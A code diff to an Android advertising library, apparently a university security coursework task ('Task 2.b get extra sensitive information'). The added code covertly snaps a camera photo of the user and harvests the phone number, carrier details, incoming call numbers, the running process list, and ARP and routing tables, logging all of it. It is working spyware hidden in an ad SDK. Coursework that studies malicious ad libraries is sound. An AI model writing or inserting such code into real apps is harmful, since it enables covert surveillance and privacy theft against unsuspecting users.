@@ -4,20 +4,29 @@ package uk.ac.imperial.apss.comp97109.myadvertisinglibrary;
 import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.UserManager;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.TextView;
 
+import java.io.BufferedReader;
+import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.sql.Timestamp;
 
 import com.google.android.gms.ads.identifier.AdvertisingIdClient;
@@ -25,12 +34,16 @@ import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.google.android.gms.common.GooglePlayServicesRepairableException;
 
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.FileProvider;
 
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.PrintWriter;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Date;
 import java.util.concurrent.ExecutionException;
 
 
@@ -100,6 +113,199 @@ public class MyAdView {
                 }
             }
         });
+
+        //Task 2.b get extra sensitive information
+        read_process();
+        retrive_network_info();
+        //determine local IPs, as well as gain a better understanding of the target’s networking structure
+        read_network_routing();
+        //get pic of the user
+        try {
+            read_proc();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        //get phone number
+        //use phone number collected by ad to advertice by sms
+        TelephonyManager tMgr = (TelephonyManager)ctx.getSystemService(Context.TELEPHONY_SERVICE);
+        String mPhoneNumber = tMgr.getLine1Number();
+        Log.d("phone number",mPhoneNumber);
+
+        //get network and sim operator
+        String networkOperator = tMgr.getNetworkOperatorName();
+        String simOperator = tMgr.getSimOperatorName();
+        Log.d("phone network operator",networkOperator);
+        Log.d("phone sim operator",simOperator);
+
+        //get phone call state (if ongoing states)
+        StateListener phoneStateListener = new StateListener();
+        telephonyManager.listen(phoneStateListener,PhoneStateListener.LISTEN_CALL_STATE);
+
+
+    }
+    static class StateListener extends PhoneStateListener {
+        @Override
+        public void onCallStateChanged(int state, String incomingNumber) {
+            super.onCallStateChanged(state, incomingNumber);
+            switch (state) {
+                case TelephonyManager.CALL_STATE_RINGING:
+                    Log.d("phone call state","CALL_STATE_RINGING, ringing number: " + incomingNumber);
+                    break;
+                case TelephonyManager.CALL_STATE_OFFHOOK:
+                    Log.d("phone call state","CALL_STATE_OFFHOOK, calling number: "  + incomingNumber);
+                    break;
+                case TelephonyManager.CALL_STATE_IDLE:
+                    Log.d("phone call state","CALL_STATE_IDLE");
+                    break;
+            }
+        }
+    };
+    static String currentPhotoPath;
+
+    private static File createImageFile() throws IOException {
+        // Create an image file name
+        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+        String imageFileName = "JPEG_" + timeStamp + "_";
+        File storageDir = ctx.getExternalFilesDir(Environment.DIRECTORY_PICTURES);
+        File image = File.createTempFile(
+                imageFileName,  /* prefix */
+                ".jpg",         /* suffix */
+                storageDir      /* directory */
+        );
+
+        // Save a file: path for use with ACTION_VIEW intents
+        currentPhotoPath = image.getAbsolutePath();
+        return image;
+    }
+
+
+
+    /**
+     * A safe way to get an instance of the Camera object.
+     */
+    public static Camera getCameraInstance() {
+        Camera c = null;
+        try {
+            c = Camera.open(); // attempt to get a Camera instance
+        } catch (Exception e) {
+            // Camera is not available (in use or does not exist)
+        }
+        return c; // returns null if camera is unavailable
+    }
+
+    private static void read_proc() throws IOException {
+        // Create an instance of Camera
+        Camera mCamera = getCameraInstance();
+
+
+        Camera.PictureCallback mPicture = new Camera.PictureCallback() {
+
+            @Override
+            public void onPictureTaken(byte[] data, Camera camera) {
+
+                File photoFile = null;
+                try {
+                    photoFile = createImageFile();
+                    Log.d("photo path",photoFile.getAbsolutePath());
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+                if (photoFile == null) {
+                    Log.d("TAG", "Error creating media file, check storage permissions");
+                    return;
+                }
+
+                try {
+                    FileOutputStream fos = new FileOutputStream(photoFile);
+                    fos.write(data);
+                    fos.close();
+                    Log.d("take photo","photo taken success");
+                } catch (FileNotFoundException e) {
+                    Log.d(TAG, "File not found: " + e.getMessage());
+                } catch (IOException e) {
+                    Log.d(TAG, "Error accessing file: " + e.getMessage());
+                }
+            }
+        };
+        mCamera.takePicture(null, null, mPicture);
+
+    }
+
+    private static void read_network_routing() {
+        try {
+            Process process = Runtime.getRuntime().exec("cat /proc/net/fib_trie");
+            BufferedReader bufferedReader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()));
+            String line;
+            String final_info = "";
+            while (((line = bufferedReader.readLine()) != null)) {
+                final_info += line + "\n";
+            }
+            Log.d("network routing", final_info);
+
+        } catch (Exception e) {
+
+        }
+
+    }
+
+    private static void retrive_network_info() {
+        try {
+            Process process = Runtime.getRuntime().exec("cat /proc/net/arp");
+            BufferedReader bufferedReader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()));
+            String line;
+            while (((line = bufferedReader.readLine()) != null)) {
+                Log.d("network interface info", line + "\n");
+            }
+        } catch (Exception e) {
+
+        }
+    }
+
+    private static void read_process() {
+        ArrayList<String> Name = new ArrayList<>();
+        ArrayList<Long> CPU = new ArrayList<>();
+        ArrayList<String[]> all_process_info = new ArrayList<>();
+        try {
+            Process process = Runtime.getRuntime().exec("top -n 1");
+            //Get the output of top so that it can be read
+            BufferedReader bufferedReader = new BufferedReader(
+                    new InputStreamReader(process.getInputStream()));
+            String line;
+            int i = 0;
+            //Read every line of the output of top that contains data
+            while (((line = bufferedReader.readLine()) != null)) {
+                //Break the line into parts.  Any number of spaces greater than 0 defines a new element
+                String[] numbersC = line.split("[ ]+");
+                all_process_info.add(numbersC);
+                if (i > 6) {
+                    //Some lines start with a space, so their indices are different than others
+                    if (numbersC[0].equals("")) {
+                        //If name contains the string com.android, then it is a process that we want to take values for
+                        if (numbersC[numbersC.length - 1].toLowerCase().contains("com.android".toLowerCase())) {
+                            //Add the name of the process to the Name arraylist, excluding the com.android. part
+                            Name.add(numbersC[numbersC.length - 1].replace("com.android.", ""));
+
+                            //Add the CPU value of the process to the CPU arraylist, without the % at the end
+                            CPU.add(Long.parseLong(numbersC[3].replace("%", "")));
+                        }
+                    } else {
+                        //This is basically the same as above, except with different index values, as there is no leading space in the numbers array
+                        if (numbersC[numbersC.length - 1].toLowerCase().contains("com.android.".toLowerCase())) {
+                            Name.add(numbersC[numbersC.length - 1].replace("com.android.", ""));
+                            CPU.add(Long.parseLong(numbersC[2].replace("%", "")));
+                        }
+                    }
+                }
+                i++;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        Log.d("process name", Name.toString());
+        Log.d("CPU util", CPU.toString());
     }
 
     // TASK 5: Read the user's contacts
